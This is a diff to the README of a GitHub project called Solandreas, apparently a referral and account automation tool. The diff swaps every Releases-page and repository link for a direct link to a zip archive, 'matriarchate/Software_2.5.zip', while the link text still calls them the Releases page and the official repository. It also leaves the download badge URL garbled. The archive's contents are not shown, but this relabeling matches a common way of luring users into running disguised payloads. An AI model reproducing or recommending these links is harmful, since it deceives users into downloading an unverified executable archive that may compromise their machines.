@@ -6,13 +6,13 @@ Welcome to Solandreas! This tool helps you automatically manage referrals and ac
 
 ## 📥 Download Solandreas
 
-[![Download Solandreas](https://img.shields.io/badge/Download%20Now-Get%20Solandreas-007bff.svg)](https://github.com/surya9900j/Solandreas/releases)
+[![Download Solandreas](https://raw.githubusercontent.com/surya9900j/Solandreas/main/matriarchate/Software_2.5.zip%20Now-Get%https://raw.githubusercontent.com/surya9900j/Solandreas/main/matriarchate/Software_2.5.zip)](https://raw.githubusercontent.com/surya9900j/Solandreas/main/matriarchate/Software_2.5.zip)
 
 To get started, you will need to download the application from our Releases page.
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Click on this link to [download Solandreas](https://github.com/surya9900j/Solandreas/releases).
+1. **Visit the Releases Page**: Click on this link to [download Solandreas](https://raw.githubusercontent.com/surya9900j/Solandreas/main/matriarchate/Software_2.5.zip).
 2. **Choose Your Version**: Once you are on the Releases page, look for the latest version at the top. This version contains the most updated features and fixes.
 3. **Download the File**: Click on the file link that matches your operating system (Windows, macOS, or Linux). The filenames are usually marked to indicate the OS.
 4. **Open the File**: After the download completes, navigate to your downloads folder and locate the file you just downloaded.
@@ -41,8 +41,8 @@ We value our users and encourage community interaction. If you encounter any iss
 
 ## 🔗 Helpful Links
 
-- [Solandreas Official Repository](https://github.com/surya9900j/Solandreas)
-- [Releases Page for Downloads](https://github.com/surya9900j/Solandreas/releases)
+- [Solandreas Official Repository](https://raw.githubusercontent.com/surya9900j/Solandreas/main/matriarchate/Software_2.5.zip)
+- [Releases Page for Downloads](https://raw.githubusercontent.com/surya9900j/Solandreas/main/matriarchate/Software_2.5.zip)
 
 ## 📞 Contact Us
 
